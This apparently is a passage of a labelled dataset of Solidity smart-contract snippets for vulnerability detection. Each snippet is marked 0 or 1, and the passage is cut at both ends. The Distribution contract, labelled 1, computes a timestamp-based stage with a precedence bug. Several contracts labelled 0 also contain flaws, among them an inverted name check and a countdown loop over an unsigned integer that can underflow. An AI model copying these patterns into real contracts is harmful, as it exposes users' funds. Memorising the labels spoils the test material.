allowed[from][msg.sender].sub(tokens);        accounts[to].balance = accounts[to].balance.add(tokens);        require(renewDec(fromOldBal, accounts[from].balance));        require(renewDec(toOldBal, accounts[to].balance));        emit Transfer(from, to, tokens);        return true;     }                             function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {        require(frozen == false);         require(bitmask_check(msg.sender, 1024) == false);          allowed[msg.sender][spender] = tokens;        emit Approval(msg.sender, spender, tokens);        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);        return true;    }                   function () public payable {        revert();    }                     function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {        require(frozen == false);         return ERC20Interface(tokenAddress).transfer(owner, tokens);    }}  
0<CODESPLIT>contract BasicToken is ERC20Basic {  using SafeMath for uint256;  mapping(address => uint256) balances;  uint256 totalSupply_;     function totalSupply() public view returns (uint256) {    return totalSupply_;  }     function transfer(address _to, uint256 _value) public returns (bool) {    require(_to != address(0));    require(_value <= balances[msg.sender]);    balances[msg.sender] = balances[msg.sender].sub(_value);    balances[_to] = balances[_to].add(_value);    emit Transfer(msg.sender, _to, _value);    return true;  }     function balanceOf(address _owner) public view returns (uint256) {    return balances[_owner];  }}  
0<CODESPLIT>contract OwnedPausableToken is StandardToken, Pausable {     modifier whenNotPausedOrIsOwner() {    require(!paused || msg.sender == owner);    _;  }  function transfer(address _to, uint256 _value) public whenNotPausedOrIsOwner returns (bool) {    return super.transfer(_to, _value);  }  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {    return super.transferFrom(_from, _to, _value);  }  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {    return super.approve(_spender, _value);  }  function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {    return super.increaseApproval(_spender, _addedValue);  }  function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {    return super.decreaseApproval(_spender, _subtractedValue);  }} 
0<CODESPLIT>contract IDAVToken is ERC20 {  function name() public view returns (string) {}  function symbol() public view returns (string) {}  function decimals() public view returns (uint8) {}  function increaseApproval(address _spender, uint _addedValue) public returns (bool success);  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success);  function owner() public view returns (address) {}  function transferOwnership(address newOwner) public;  function burn(uint256 _value) public;  function pauseCutoffTime() public view returns (uint256) {}  function paused() public view returns (bool) {}  function pause() public;  function unpause() public;  function setPauseCutoffTime(uint256 _pauseCutoffTime) public;}  
0<CODESPLIT>contract BurnableToken is BasicToken {  event Burn(address indexed burner, uint256 value);     function burn(uint256 _value) public {    _burn(msg.sender, _value);  }  function _burn(address _who, uint256 _value) internal {    require(_value <= balances[_who]);              balances[_who] = balances[_who].sub(_value);    totalSupply_ = totalSupply_.sub(_value);    emit Burn(_who, _value);    emit Transfer(_who, address(0), _value);  }}  
0<CODESPLIT>contract DAVToken is IDAVToken, BurnableToken, OwnedPausableToken {     string public name = 'DAV Token';  string public symbol = 'DAV';  uint8 public decimals = 18;     uint256 public pauseCutoffTime;     constructor(uint256 _initialSupply) public {    totalSupply_ = _initialSupply;    balances[msg.sender] = totalSupply_;  }     function setPauseCutoffTime(uint256 _pauseCutoffTime) onlyOwner public {              require(_pauseCutoffTime >= block.timestamp);         require(pauseCutoffTime == 0);         pauseCutoffTime = _pauseCutoffTime;  }     function pause() onlyOwner whenNotPaused public {              require(pauseCutoffTime == 0 || pauseCutoffTime >= block.timestamp);    paused = true;    emit Pause();  }}  
0<CODESPLIT>contract Identity {  struct DAVIdentity {    address wallet;  }  mapping (address => DAVIdentity) private identities;  DAVToken private token;     bytes28 private constant ETH_SIGNED_MESSAGE_PREFIX = '\x19Ethereum Signed Message:\n32';  bytes25 private constant DAV_REGISTRATION_REQUEST = 'DAV Identity Registration';     function Identity(DAVToken _davTokenContract) public {    token = _davTokenContract;  }  function register(address _id, uint8 _v, bytes32 _r, bytes32 _s) public {         require(      identities[_id].wallet == 0x0    );         bytes32 prefixedHash = keccak256(ETH_SIGNED_MESSAGE_PREFIX, keccak256(DAV_REGISTRATION_REQUEST));         require(      ecrecover(prefixedHash, _v, _r, _s) == _id    );         identities[_id] = DAVIdentity({      wallet: msg.sender    });  }  function registerSimple() public {         require(      identities[msg.sender].wallet == 0x0    );         identities[msg.sender] = DAVIdentity({      wallet: msg.sender    });  }  function getBalance(address _id) public view returns (uint256 balance) {    return token.balanceOf(identities[_id].wallet);  }  function verifyOwnership(address _id, address _wallet) public view returns (bool verified) {    return identities[_id].wallet == _wallet;  }     function isRegistered(address _id) public view returns (bool) {    return identities[_id].wallet != 0x0;  }     function getIdentityWallet(address _id) public view returns (address) {    return identities[_id].wallet;  }}
0<CODESPLIT>contract Sale {	address public owner;	uint public start;	uint public end;	modifier onlyOwner() {		require(msg.sender == owner);		_;	}	function softCap(uint _newend) onlyOwner {		require(_newend >= block.timestamp && _newend >= start && _newend <= end);		return;	}}
1<CODESPLIT>contract Distribution{  uint256 public stageDuration;  uint256 public startTime;  function getStage() public view returns(uint16) {    return uint16(uint256(block.timestamp) - (startTime) / (stageDuration));  }}
0<CODESPLIT>contract EtherCityConfig{    struct BuildingData    {        uint256 population;        uint256 creditsPerSec;            uint256 maxUpgrade;        uint256 constructCredit;        uint256 constructEther;        uint256 upgradeCredit;        uint256 demolishCredit;        uint256 constructSale;        uint256 upgradeSale;        uint256 demolishSale;    }    uint256 private initCredits;    uint256 private initLandCount;    uint256 private initcreditsPerSec;    uint256 private maxLandCount;    uint256 private ethLandCost;    uint256 private creditsPerEth;    address private owner;    address private admin;    mapping(uint256 => BuildingData) private buildingData;        constructor() public payable    {        owner = msg.sender;        creditsPerEth = 1;    }    function SetAdmin(address addr) external    {        assert(msg.sender == owner);        admin = addr;    }        function GetVersion() external pure returns(uint256)    {        return 1000;    }    function GetInitData() external view returns(uint256 ethland, uint256 maxland, uint256 credits, uint256 crdtsec, uint256 landCount)    {        ethland = ethLandCost;        maxland = maxLandCount;        credits = initCredits;        crdtsec = initcreditsPerSec;        landCount = initLandCount;    }    function SetInitData(uint256 ethland, uint256 maxland, uint256 credits, uint256 crdtsec, uint256 landCount) external    {        require(msg.sender == owner || msg.sender == admin);        ethLandCost = ethland;        maxLandCount = maxland;        initCredits = credits;        initcreditsPerSec = crdtsec;        initLandCount = landCount;    }    function GetCreditsPerEth() external view returns(uint256)    {        return creditsPerEth;    }    function SetCreditsPerEth(uint256 crdteth) external    {        require(crdteth > 0);        require(msg.sender == owner || msg.sender == admin);        creditsPerEth = crdteth;    }    function GetLandData() external view returns(uint256 ethland, uint256 maxland)    {        ethland = ethLandCost;        maxland = maxLandCount;    }    function GetBuildingData(uint256 id) external view returns(uint256 bid, uint256 population, uint256 crdtsec,                             uint256 maxupd, uint256 cnstcrdt, uint256 cnsteth, uint256 updcrdt, uint256 dmlcrdt,                            uint256 cnstcrdtsale, uint256 cnstethsale, uint256 updcrdtsale, uint256 dmlcrdtsale)    {        BuildingData storage bdata = buildingData[id];        bid = id;        population = bdata.population;            crdtsec = bdata.creditsPerSec;            maxupd = bdata.maxUpgrade;        cnstcrdt = bdata.constructCredit;        cnsteth = bdata.constructEther;        updcrdt = bdata.upgradeCredit;        dmlcrdt = bdata.demolishCredit;        cnstcrdtsale = bdata.constructCredit * bdata.constructSale / 100;        cnstethsale = bdata.constructEther * bdata.constructSale /100;        updcrdtsale = bdata.upgradeCredit * bdata.upgradeSale / 100;        dmlcrdtsale = bdata.demolishCredit * bdata.demolishSale / 100;    }    function SetBuildingData(uint256 bid, uint256 pop, uint256 crdtsec, uint256 maxupd,                            uint256 cnstcrdt, uint256 cnsteth, uint256 updcrdt, uint256 dmlcrdt) external    {        require(msg.sender == owner || msg.sender == admin);        buildingData[bid] = BuildingData({population:pop, creditsPerSec:crdtsec, maxUpgrade:maxupd,                            constructCredit:cnstcrdt, constructEther:cnsteth, upgradeCredit:updcrdt, demolishCredit:dmlcrdt,                            constructSale:100, upgradeSale:100, demolishSale:100                            });    }    function SetBuildingSale(uint256 bid, uint256 cnstsale, uint256 updsale, uint256 dmlsale) external    {        BuildingData storage bdata = buildingData[bid];        require(0 < cnstsale && cnstsale <= 100);        require(0 < updsale && updsale <= 100);        require(msg.sender == owner || msg.sender == admin);        bdata.constructSale = cnstsale;        bdata.upgradeSale = updsale;        bdata.demolishSale = dmlsale;    }    function SetBuildingDataArray(uint256[] data) external    {        require(data.length % 8 == 0);        require(msg.sender == owner || msg.sender == admin);        for(uint256 index = 0; index < data.length; index += 8)        {            BuildingData storage bdata = buildingData[data[index]];            bdata.population = data[index + 1];            bdata.creditsPerSec = data[index + 2];            bdata.maxUpgrade = data[index + 3];            bdata.constructCredit = data[index + 4];            bdata.constructEther = data[index + 5];            bdata.upgradeCredit = data[index + 6];            bdata.demolishCredit = data[index + 7];            bdata.constructSale = 100;            bdata.upgradeSale = 100;            bdata.demolishSale = 100;        }    }    function GetBuildingParam(uint256 id) external view                returns(uint256 population, uint256 crdtsec, uint256 maxupd)    {        BuildingData storage bdata = buildingData[id];        population = bdata.population;            crdtsec = bdata.creditsPerSec;            maxupd = bdata.maxUpgrade;    }    function GetConstructCost(uint256 id, uint256 count) external view                returns(uint256 cnstcrdt, uint256 cnsteth)    {        BuildingData storage bdata = buildingData[id];        cnstcrdt = bdata.constructCredit * bdata.constructSale / 100  * count;        cnsteth = bdata.constructEther * bdata.constructSale / 100  * count;    }    function GetUpgradeCost(uint256 id, uint256 count) external view                returns(uint256 updcrdt)    {        BuildingData storage bdata = buildingData[id];        updcrdt = bdata.upgradeCredit * bdata.upgradeSale / 100 * count;    }    function GetDemolishCost(uint256 id, uint256 count) external view                returns(uint256)    {        BuildingData storage bdata = buildingData[id];        return bdata.demolishCredit * bdata.demolishSale / 100 * count;   }}
0<CODESPLIT>contract EtherCityRank{    struct LINKNODE    {        uint256 count;        uint256 leafLast;    }    struct LEAFNODE    {        address player;        uint256 population;        uint256 time;        uint256 prev;        uint256 next;    }    uint256 private constant LINK_NULL = uint256(-1);    uint256 private constant LEAF_PER_LINK = 30;    uint256 private constant LINK_COUNT = 10;    uint256 private constant LINK_ENDIDX = LINK_COUNT - 1;    mapping(uint256 => LINKNODE) private linkNodes;      mapping(uint256 => LEAFNODE) private leafNodes;    uint256 private leafCount;    address private owner;    address private admin;    address private city;        constructor() public payable    {        owner = msg.sender;        for(uint256 index = 1; index < LINK_COUNT; index++)            linkNodes[index] = LINKNODE({count:0, leafLast:LINK_NULL});                 linkNodes[0] = LINKNODE({count:1, leafLast:0});        leafNodes[0] = LEAFNODE({player:address(0), population:uint256(-1), time:0, prev:LINK_NULL, next:LINK_NULL});        leafCount = 1;    }    function GetVersion() external pure returns(uint256)    {        return 1000;    }    function GetRank(uint16 rankidx) external view returns(address player, uint256 pop, uint256 time, uint256 nextidx)    {        uint256 leafidx;        if (rankidx == 0)            leafidx = leafNodes[0].next;        else            leafidx = rankidx;        if (leafidx != LINK_NULL)        {            player = leafNodes[leafidx].player;            pop = leafNodes[leafidx].population;            time = leafNodes[leafidx].time;            nextidx = leafNodes[leafidx].next;        }        else        {            player = address(0);            pop = 0;            time = 0;            nextidx = 0;        }    }    function UpdateRank(address player, uint256 pop_new, uint256 time_new) external    {        bool found;        uint256 linkidx;        uint256 leafidx;        uint256 emptyidx;        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        emptyidx = RemovePlayer(player);        (found, linkidx, leafidx) = findIndex(pop_new, time_new);        if (linkidx == LINK_NULL)            return;        if (linkNodes[LINK_ENDIDX].count == LEAF_PER_LINK)        {                emptyidx = linkNodes[LINK_ENDIDX].leafLast;            RemoveRank(LINK_ENDIDX, emptyidx);        }        else if (emptyidx == LINK_NULL)        {            emptyidx = leafCount;            leafCount++;        }        leafNodes[emptyidx] = LEAFNODE({player:player, population:pop_new, time:time_new, prev:LINK_NULL, next:LINK_NULL});                 InsertRank(linkidx, leafidx, emptyidx);    }              function adminSetAdmin(address addr) external    {        require(owner == msg.sender);        admin = addr;    }    function adminSetCity(address addr) external    {        require(owner == msg.sender || admin == msg.sender);        city = addr;    }    function adminResetRank() external    {        require(owner == msg.sender || admin == msg.sender);        for(uint256 index = 1; index < LINK_COUNT; index++)            linkNodes[index] = LINKNODE({count:0, leafLast:LINK_NULL});                 linkNodes[0] = LINKNODE({count:1, leafLast:0});        leafNodes[0] = LEAFNODE({player:address(0), population:uint256(-1), time:0, prev:LINK_NULL, next:LINK_NULL});        leafCount = 1;    }              function findIndex(uint256 pop, uint256 time) private view returns(bool found, uint256 linkidx, uint256 leafidx)    {        uint256 comp;        found = false;        for(linkidx = 0; linkidx < LINK_COUNT; linkidx++)        {            LINKNODE storage lknode = linkNodes[linkidx];            if (lknode.count < LEAF_PER_LINK)                break;            LEAFNODE storage lfnode = leafNodes[lknode.leafLast];            if ((compareLeaf(pop, time, lfnode.population, lfnode.time) >= 1))                break;        }        if (linkidx == LINK_COUNT)        {            linkidx = (linkNodes[LINK_ENDIDX].count < LEAF_PER_LINK) ? LINK_ENDIDX : LINK_NULL;            leafidx = LINK_NULL;            return;        }                    leafidx = lknode.leafLast;        for(uint256 index = 0; index < lknode.count; index++)        {            lfnode = leafNodes[leafidx];            comp = compareLeaf(pop, time, lfnode.population, lfnode.time);            if (comp == 0)               {                leafidx = lfnode.next;                break;            }            else if (comp == 1)              {                found = true;                break;            }            if (index + 1 < lknode.count)                leafidx = lfnode.prev;        }    }        function InsertRank(uint256 linkidx, uint256 leafidx_before, uint256 leafidx_new) private    {        uint256 leafOnLink;        uint256 leafLast;        if (leafidx_before == LINK_NULL)        {                leafLast = linkNodes[linkidx].leafLast;            if (leafLast != LINK_NULL)                ConnectLeaf(leafidx_new, leafNodes[leafLast].next);            else                leafNodes[leafidx_new].next = LINK_NULL;            ConnectLeaf(leafLast, leafidx_new);            linkNodes[linkidx].leafLast = leafidx_new;            linkNodes[linkidx].count++;            return;        }        ConnectLeaf(leafNodes[leafidx_before].prev, leafidx_new);        ConnectLeaf(leafidx_new, leafidx_before);        leafLast = LINK_NULL;        for(uint256 index = linkidx; index < LINK_COUNT; index++)        {            leafOnLink = linkNodes[index].count;            if (leafOnLink < LEAF_PER_LINK)            {                if (leafOnLink == 0)                      linkNodes[index].leafLast = leafLast;                linkNodes[index].count++;                break;            }            leafLast = linkNodes[index].leafLast;            linkNodes[index].leafLast = leafNodes[leafLast].prev;        }    }    function RemoveRank(uint256 linkidx, uint256 leafidx) private    {        uint256 next;        for(uint256 index = linkidx; index < LINK_COUNT; index++)        {            LINKNODE storage link = linkNodes[index];                        next = leafNodes[link.leafLast].next;            if (next == LINK_NULL)            {                link.count--;                if (link.count == 0)                    link.leafLast = LINK_NULL;                break;            }            else                link.leafLast = next;        }        LEAFNODE storage leaf_cur = leafNodes[leafidx];        if (linkNodes[linkidx].leafLast == leafidx)            linkNodes[linkidx].leafLast = leaf_cur.prev;        ConnectLeaf(leaf_cur.prev, leaf_cur.next);    }    function RemovePlayer(address player) private returns(uint256 leafidx)    {        for(uint256 linkidx = 0; linkidx < LINK_COUNT; linkidx++)        {            LINKNODE storage lknode = linkNodes[linkidx];            leafidx = lknode.leafLast;            for(uint256 index = 0; index < lknode.count; index++)            {                LEAFNODE storage lfnode = leafNodes[leafidx];                if (lfnode.player == player)                {                    RemoveRank(linkidx, leafidx);                    return;                }                leafidx = lfnode.prev;            }        }        return LINK_NULL;    }    function ConnectLeaf(uint256 leafprev, uint256 leafnext) private    {        if (leafprev != LINK_NULL)            leafNodes[leafprev].next = leafnext;        if (leafnext != LINK_NULL)            leafNodes[leafnext].prev = leafprev;    }    function compareLeaf(uint256 pop1, uint256 time1, uint256 pop2, uint256 time2) private pure returns(uint256)    {        if (pop1 > pop2)            return 2;        else if (pop1 < pop2)            return 0;        if (time1 > time2)            return 2;        else if (time1 < time2)            return 0;        return 1;    }}
0<CODESPLIT>contract EtherCityData{    struct WORLDDATA    {        uint256 ethBalance;        uint256 ethDev;        uint256 population;        uint256 credits;        uint256 starttime;    }    struct WORLDSNAPSHOT    {        bool valid;        uint256 ethDay;        uint256 ethBalance;        uint256 ethRankFund;        uint256 ethShopFund;        uint256 ethRankFundRemain;        uint256 ethShopFundRemain;        uint256 population;        uint256 credits;        uint256 lasttime;    }    struct CITYDATA    {        bytes32 name;        uint256 credits;        uint256 population;        uint256 creditsPerSec;            uint256 landOccupied;        uint256 landUnoccupied;        uint256 starttime;        uint256 lasttime;        uint256 withdrawSS;    }    struct CITYSNAPSHOT    {        bool valid;        uint256 population;        uint256 credits;        uint256 shopCredits;        uint256 lasttime;    }    struct BUILDINGDATA    {        uint256 constructCount;        uint256 upgradeCount;        uint256 population;        uint256 creditsPerSec;        }    uint256 private constant INTFLOATDIV = 100;    address private owner;    address private admin;    address private city;    bool private enabled;    WORLDDATA private worldData;    mapping(uint256 => WORLDSNAPSHOT) private worldSnapshot;    address[] private playerlist;    mapping(address => CITYDATA) private cityData;    mapping(address => mapping(uint256 => CITYSNAPSHOT)) private citySnapshot;    mapping(address => mapping(uint256 => BUILDINGDATA)) private buildings;    mapping(address => uint256) private ethBalance;    constructor() public payable    {        owner = msg.sender;        enabled = true;        worldData = WORLDDATA({ethBalance:0, ethDev:0, population:0, credits:0, starttime:block.timestamp});        worldSnapshot[nowday()] = WORLDSNAPSHOT({valid:true, ethDay:0, ethBalance:0, ethRankFund:0, ethShopFund:0, ethRankFundRemain:0, ethShopFundRemain:0, population:0, credits:0, lasttime:block.timestamp});    }    function GetVersion() external pure returns(uint256)    {        return 1001;    }    function IsPlayer(address player) external view returns(bool)    {        for(uint256 index = 0; index < playerlist.length; index++)         {             if (playerlist[index] == player)                return true;         }        return false;    }    function IsCityNameExist(bytes32 cityname) external view returns(bool)    {        for(uint256 index = 0; index < playerlist.length; index++)        {            if (cityData[playerlist[index]].name == cityname)               return false;        }        return true;    }    function CreateCityData(address player, uint256 crdtsec, uint256 landcount) external    {        uint256 day;        require(cityData[player].starttime == 0);        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        playerlist.push(player);             day = nowday();        cityData[player] = CITYDATA({name:0, credits:0, population:0, creditsPerSec:crdtsec, landOccupied:0, landUnoccupied:landcount, starttime:block.timestamp, lasttime:block.timestamp, withdrawSS:day});        citySnapshot[player][day] = CITYSNAPSHOT({valid:true, population:0, credits:0, shopCredits:0, lasttime:block.timestamp});    }    function GetWorldData() external view returns(uint256 ethBal, uint256 ethDev, uint256 population, uint256 credits, uint256 starttime)    {        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        ethBal = worldData.ethBalance;        ethDev = worldData.ethDev;        population = worldData.population;        credits = worldData.credits;        starttime = worldData.starttime;    }    function SetWorldData(uint256 ethBal, uint256 ethDev, uint256 population, uint256 credits, uint256 starttime) external    {        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        worldData.ethBalance = ethBal;        worldData.ethDev = ethDev;        worldData.population = population;        worldData.credits = credits;        worldData.starttime = starttime;    }    function SetWorldSnapshot(uint256 day, bool valid, uint256 population, uint256 credits, uint256 lasttime) external    {        WORLDSNAPSHOT storage wss = worldSnapshot[day];        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        wss.valid = valid;        wss.population = population;        wss.credits = credits;        wss.lasttime = lasttime;    }    function GetCityData(address player) external view returns(uint256 credits, uint256 population, uint256 creditsPerSec,                                    uint256 landOccupied, uint256 landUnoccupied, uint256 lasttime)    {        CITYDATA storage cdata = cityData[player];        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        credits = cdata.credits;        population = cdata.population;        creditsPerSec = cdata.creditsPerSec;        landOccupied = cdata.landOccupied;        landUnoccupied = cdata.landUnoccupied;        lasttime = cdata.lasttime;    }    function SetCityData(address player, uint256 credits, uint256 population, uint256 creditsPerSec,                        uint256 landOccupied, uint256 landUnoccupied, uint256 lasttime) external    {        CITYDATA storage cdata = cityData[player];        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        cdata.credits = credits;        cdata.population = population;        cdata.creditsPerSec = creditsPerSec;        cdata.landOccupied = landOccupied;        cdata.landUnoccupied = landUnoccupied;        cdata.lasttime = lasttime;    }    function GetCityName(address player) external view returns(bytes32)    {        return cityData[player].name;    }    function SetCityName(address player, bytes32 name) external    {        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        cityData[player].name = name;    }    function GetCitySnapshot(address player, uint256 day) external view returns(bool valid, uint256 population, uint256 credits, uint256 shopCredits, uint256 lasttime)    {        CITYSNAPSHOT storage css = citySnapshot[player][day];        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        valid = css.valid;        population = css.population;        credits = css.credits;        shopCredits = css.shopCredits;        lasttime = css.lasttime;    }    function SetCitySnapshot(address player, uint256 day, bool valid, uint256 population, uint256 credits, uint256 shopCredits, uint256 lasttime) external    {        CITYSNAPSHOT storage css = citySnapshot[player][day];        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        css.valid = valid;        css.population = population;        css.credits = credits;        css.shopCredits = shopCredits;        css.lasttime = lasttime;    }    function GetBuildingData(address player, uint256 id) external view returns(uint256 constructCount, uint256 upgradeCount, uint256 population, uint256 creditsPerSec)    {        BUILDINGDATA storage bdata = buildings[player][id];        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        constructCount = bdata.constructCount;        upgradeCount = bdata.upgradeCount;        population = bdata.population;        creditsPerSec = bdata.creditsPerSec;    }    function SetBuildingData(address player, uint256 id, uint256 constructCount, uint256 upgradeCount, uint256 population, uint256 creditsPerSec) external    {        BUILDINGDATA storage bdata = buildings[player][id];        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        bdata.constructCount = constructCount;        bdata.upgradeCount = upgradeCount;        bdata.population = population;        bdata.creditsPerSec = creditsPerSec;    }    function GetEthBalance(address player) external view returns(uint256)    {        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        return ethBalance[player];    }    function SetEthBalance(address player, uint256 eth) external    {        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        ethBalance[player] = eth;    }    function AddEthBalance(address player, uint256 eth) external    {        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        ethBalance[player] += eth;    }    function GetWithdrawBalance(address player) external view returns(uint256 ethBal)    {        uint256 startday;        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        ethBal = ethBalance[player];        startday = cityData[player].withdrawSS;        for(uint256 day = nowday() - 1; day >= startday; day--)        {            WORLDSNAPSHOT memory wss = TestWorldSnapshotInternal(day);            CITYSNAPSHOT memory css = TestCitySnapshotInternal(player, day);            ethBal += Math.min256(SafeMath.muldiv(wss.ethRankFund, css.population, wss.population), wss.ethRankFundRemain);        }    }    function WithdrawEther(address player) external    {        uint256 startday;        uint256 ethBal;        uint256 eth;        CITYDATA storage cdata = cityData[player];        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        ethBal = ethBalance[player];        startday = cdata.withdrawSS;        for(uint256 day = nowday() - 1; day >= startday; day--)        {            WORLDSNAPSHOT storage wss = ValidateWorldSnapshotInternal(day);            CITYSNAPSHOT storage css = ValidateCitySnapshotInternal(player, day);            if (wss.ethRankFundRemain > 0)            {                eth = Math.min256(SafeMath.muldiv(wss.ethRankFund, css.population, wss.population), wss.ethRankFundRemain);                wss.ethRankFundRemain -= eth;                ethBal += eth;            }        }        require(0 < ethBal);        ethBalance[player] = 0;        cdata.withdrawSS = nowday() - 1;        player.transfer(ethBal);    }    function GetEthShop(address player) external view returns(uint256 shopEth, uint256 shopCredits)    {        uint256 day;        CITYSNAPSHOT memory css;        WORLDSNAPSHOT memory wss;        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        day = nowday() - 1;        if (day < cityData[player].starttime / 24 hours)        {            shopEth = 0;            shopCredits = 0;            return;        }        wss = TestWorldSnapshotInternal(day);        css = TestCitySnapshotInternal(player, day);        shopEth = Math.min256(SafeMath.muldiv(wss.ethShopFund, css.shopCredits, wss.credits), wss.ethShopFundRemain);        shopCredits = css.shopCredits;    }    function TradeEthShop(address player, uint256 credits) external    {        uint256 day;        uint256 shopEth;        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        day = nowday() - 1;        require(day >= cityData[player].starttime / 24 hours);        WORLDSNAPSHOT storage wss = ValidateWorldSnapshotInternal(day);        CITYSNAPSHOT storage css = ValidateCitySnapshotInternal(player, day);        require(wss.ethShopFundRemain > 0);        require((0 < credits) && (credits <= css.shopCredits));        shopEth = Math.min256(SafeMath.muldiv(wss.ethShopFund, css.shopCredits, wss.credits), wss.ethShopFundRemain);        wss.ethShopFundRemain -= shopEth;        css.shopCredits -= credits;        ethBalance[player] += shopEth;    }    function UpdateEthBalance(uint256 bal, uint256 devf, uint256 rnkf, uint256 shpf) external payable    {        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        worldData.ethBalance += bal + devf + rnkf + shpf;        worldData.ethDev += devf;        WORLDSNAPSHOT storage wss = ValidateWorldSnapshotInternal(nowday());        wss.ethDay += bal + devf + rnkf + shpf;        wss.ethBalance += bal;        wss.ethRankFund += rnkf;        wss.ethShopFund += shpf;        wss.ethRankFundRemain += rnkf;        wss.ethShopFundRemain += shpf;        wss.lasttime = block.timestamp;        ethBalance[owner] += devf;    }    function ValidateWorldSnapshot(uint256 day) external returns(uint256 ethRankFund, uint256 population, uint256 credits, uint256 lasttime)    {        WORLDSNAPSHOT storage wss = ValidateWorldSnapshotInternal(day);        require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        ethRankFund = wss.ethRankFund;        population = wss.population;        credits = wss.credits;        lasttime = wss.lasttime;    }    function TestWorldSnapshot(uint256 day) external view returns(uint256 ethRankFund, uint256 population, uint256 credits, uint256 lasttime)    {        WORLDSNAPSHOT memory wss = TestWorldSnapshotInternal(day);        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        ethRankFund = wss.ethRankFund;        population = wss.population;        credits = wss.credits;        lasttime = wss.lasttime;    }    function ValidateCitySnapshot(address player, uint256 day) external returns(uint256 population, uint256 credits, uint256 shopCredits, uint256 lasttime)    {        CITYSNAPSHOT storage css = ValidateCitySnapshotInternal(player, day);            require(owner == msg.sender || admin == msg.sender || (enabled && city == msg.sender));        population = css.population;        credits = css.credits;        shopCredits = css.shopCredits;        lasttime = css.lasttime;    }    function TestCitySnapshot(address player, uint256 day) external view returns(uint256 population, uint256 credits, uint256 shopCredits, uint256 lasttime)    {        CITYSNAPSHOT memory css = TestCitySnapshotInternal(player, day);        require(owner == msg.sender || admin == msg.sender || city == msg.sender);        population = css.population;        credits = css.credits;        shopCredits = css.shopCredits;        lasttime = css.lasttime;    }              function nowday() private view returns(uint256)    {        return block.timestamp / 24 hours;    }    function adminSetAdmin(address addr) external    {        require(owner == msg.sender);        admin = addr;    }    function adminSetCity(address addr) external    {        require(owner == msg.sender || admin == msg.sender);        city = addr;    }    function adminGetEnabled() external view returns(bool)    {        require(owner == msg.sender || admin == msg.sender);        return enabled;    }    function adminSetEnabled(bool bval) external    {        require(owner == msg.sender || admin == msg.sender);        enabled = bval;    }    function adminGetWorldData() external view returns(uint256 eth, uint256 ethDev,                                                 uint256 population, uint256 credits, uint256 starttime)    {        require(msg.sender == owner || msg.sender == admin);        eth = worldData.ethBalance;        ethDev = worldData.ethDev;        population = worldData.population;        credits = worldData.credits;        starttime = worldData.starttime;    }    function adminGetWorldSnapshot(uint256 day) external view returns(bool valid, uint256 ethDay, uint256 ethBal, uint256 ethRankFund, uint256 ethShopFund, uint256 ethRankFundRemain,                                uint256 ethShopFundRemain, uint256 population, uint256 credits, uint256 lasttime)    {        WORLDSNAPSHOT storage wss = worldSnapshot[day];        require(owner == msg.sender || admin == msg.sender);        valid = wss.valid;        ethDay = wss.ethDay;        ethBal = wss.ethBalance;        ethRankFund = wss.ethRankFund;        ethShopFund = wss.ethShopFund;        ethRankFundRemain = wss.ethRankFundRemain;        ethShopFundRemain = wss.ethShopFundRemain;        population = wss.population;        credits = wss.credits;        lasttime = wss.lasttime;    }    function adminSetWorldSnapshot(uint256 day, bool valid, uint256 ethDay, uint256 ethBal, uint256 ethRankFund, uint256 ethShopFund, uint256 ethRankFundRemain,                                uint256 ethShopFundRemain, uint256 population, uint256 credits, uint256 lasttime) external    {        WORLDSNAPSHOT storage wss = worldSnapshot[day];        require(owner == msg.sender || admin == msg.sender);        wss.valid = valid;        wss.ethDay = ethDay;        wss.ethBalance = ethBal;        wss.ethRankFund = ethRankFund;        wss.ethShopFund = ethShopFund;        wss.ethRankFundRemain = ethRankFundRemain;        wss.ethShopFundRemain = ethShopFundRemain;        wss.population = population;        wss.credits = credits;        wss.lasttime = lasttime;    }    function adminGetCityData(address player) external view returns(bytes32 name, uint256 credits, uint256 population, uint256 creditsPerSec,                                    uint256 landOccupied, uint256 landUnoccupied, uint256 starttime, uint256 lasttime, uint256 withdrawSS)    {        CITYDATA storage cdata = cityData[player];        require(owner == msg.sender || admin == msg.sender);        name = cdata.name;        credits = cdata.credits;        population = cdata.population;        creditsPerSec = cdata.creditsPerSec;        landOccupied = cdata.landOccupied;        landUnoccupied = cdata.landUnoccupied;        starttime = cdata.starttime;        lasttime = cdata.lasttime;        withdrawSS = cdata.withdrawSS;    }    function adminSetCityData(address player, bytes32 name, uint256 credits, uint256 population, uint256 creditsPerSec,                        uint256 landOccupied, uint256 landUnoccupied, uint256 starttime, uint256 lasttime, uint256 withdrawSS) external    {        CITYDATA storage cdata = cityData[player];        require(owner == msg.sender || admin == msg.sender);        cdata.name = name;        cdata.credits = credits;        cdata.population = population;        cdata.creditsPerSec = creditsPerSec;        cdata.landOccupied = landOccupied;        cdata.landUnoccupied = landUnoccupied;        cdata.starttime = starttime;        cdata.lasttime = lasttime;        